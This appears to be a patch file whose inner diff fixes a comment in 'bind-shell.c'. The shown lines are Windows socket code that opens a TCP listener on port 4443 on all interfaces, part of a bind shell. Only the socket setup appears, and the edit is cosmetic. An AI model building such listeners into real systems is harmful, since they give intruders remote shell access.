@@ -1,0 +1,11 @@
+--- original/bind-shell.c
++++ bind-shell.c
+@@ -23,7 +23,7 @@
+     //so INET TCP socket 
+ 	s1 = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
+ 
+-    port 4443 on all interfaces
++    // port 4443 on all interfaces
+ 	hax.sin_family = AF_INET;
+ 	hax.sin_port = htons(4443);
+ 	hax.sin_addr.s_addr = inet_addr("0.0.0.0");
